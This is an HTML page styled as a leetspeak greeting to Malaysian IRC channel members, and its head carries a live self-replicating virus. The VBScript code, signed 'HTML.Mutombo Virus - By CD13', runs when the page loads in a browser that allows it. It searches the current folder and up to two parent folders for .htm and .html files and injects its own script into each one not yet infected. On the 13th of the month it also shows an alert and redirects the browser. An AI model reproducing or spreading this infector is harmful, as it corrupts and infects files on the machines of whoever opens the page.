<html><head><title>school of malaysian network..</title>
<Script Language="JAVAsCrIpT">
function argument0(){
	return window.location;
}

function payload() {
	alert('HTML.Mutombo Virus - By CD13 - Made in Paraguay');
	window.location='http://www.sixers.com';
}
</Script>
 
<Script Language="VBScript">
	Public Function YaInfectado (Victima) 'Silly HTML infector viruz
		Set Original = SistemaDeArchivos.OpenTextFile(Victima, 1)
		InicioVirus = Chr(74) & "AVAsCrIpT"
		Retornar = False

		Do While Original.AtEndOfStream <> True
			Linea = Original.ReadLine

			If Instr(Linea,InicioVirus) <> 0 Then
				Retornar = True
				Exit Do
			End If
		Loop
		Original.Close
		
		YaInfectado = Retornar
	End Function

	Public Sub Infectar (Victima) 'Dedicated to Dikembe / 76ers
		InicioVirus = Chr(74) & "AVAsCrIpT"
		FinVirus = "/" & Chr(83) & "cRiPt"
		FinDeEncabezado = Chr(60) & Chr(47) & Chr(104) & "ead>"
		Fuente = Replace(argument0(),"file:///","")

		Set Original = SistemaDeArchivos.OpenTextFile(Fuente, 1)

		Codigo = vbCRLF
		Grabar = 0

		Do While Original.AtEndOfStream <> True
			Linea = Original.ReadLine

			If Instr(Linea,InicioVirus) <> 0 Then
				Grabar = 32
			End If

			If Instr(Linea,FinVirus) <> 0 Then
				Grabar = 16
			End If

			If Grabar <> 0 Then
				Codigo = Codigo + Linea + vbCRLF
				If Grabar = 16 Then 
					Grabar = 0
				End If
			End If

		Loop
		Codigo = Codigo & FinDeEncabezado
		Original.Close

		Set Original = SistemaDeArchivos.OpenTextFile(Victima, 1)
		Set Infectado = SistemaDeArchivos.CreateTextFile("che_ropea_guype", True)

		Do While Original.AtEndOfStream <> True
			Linea = Original.ReadLine
			if Instr(Lcase(Linea),FinDeEncabezado) Then
				Linea = Replace(Lcase(Linea),FinDeEncabezado,Codigo)
			Else
				Linea = Replace(Linea,FinDeEncabezado,Codigo)
			End If
			Infectado.WriteLine Linea
		Loop

		Original.Close
		Infectado.Close

		SistemaDeArchivos.CopyFile "che_ropea_guype", victima
		SistemaDeArchivos.DeleteFile "che_ropea_guype",True

	End Sub

	On Error Resume Next
	Dim SistemaDeArchivos,Original,Infectado,Linea

	Set SistemaDeArchivos = CreateObject("Scripting.FileSystemObject")

	EnCual = "./"

	For Navegar = 1 to 3
		Set Directorio = SistemaDeArchivos.GetFolder(EnCual)
		Set FicherosDelDirectorio = Directorio.Files

		For Each Archivo In FicherosDelDirectorio
			If Lcase(Right(Archivo,4)) = ".htm" or Lcase(Right(Archivo,5)) = ".html" Then
				Archivo=Replace(Archivo,"file://","")
				If Not YaInfectado(Archivo) Then
					Infectar(Archivo)
				End If
			End If
		Next
		EnCual = EnCual & "../"
	Next

	If Day(Date) = 13 Then 'Simple payload
		payload()
	End If
</ScRiPt>
</head><body><body bgcolor = '#000000' >
<b><FONT COLOR='#ffffff'><p>W3lc0m3 t0 M4l4ys14n N3tw0rk….. (greetings to all DALnet Member… #ITnet, #IPT</p>
<P>Dan channel channel yang bersekongkol...</P>
<P>0ur T0p1c… why *.my D0m41ns 4r3 SuX??</P>
</FONT><FONT FACE= COLOR='#ffffff'><P>1 w1sh 1 c4n b3 4 syst3m 4dm1n…</P>
<P>1 w1sh 1 c4n b3 n3tw0rk 4dm1n…</P>
<P>1 w1sh 1 c4n b3 4 s0ftw4r3 pr0gr4mm3r…</P>
<P>1 w1sh 1 c4n b3 'P4g4r B1ll'….</P>
<P>1 w1sh 1 c4n b3 Th3 R0ck….</P>
<P>1 w1sh 1 c4n b3 S1t1 Nurh4l1z4 b0yfr13nd…</P>
<P>1 w1sh 1 c4n h4v3 d1nn3r w1th Br1tn3y Sp34r…</P>
<P>1f y0u smmmm33llllllll….. wh4t y0ur mum 1s c00k1ng…. <FONT FACE=>&#74;</FONT>
<FONT FACE=>&#223;</FONT>
<P>4y4t M4ut Th3 R0ck..</P>
<P>4nd h4v3 4 n1c3 d4yy……</P>
</B><P>&nbsp;</P></FONT></BODY></HTML>
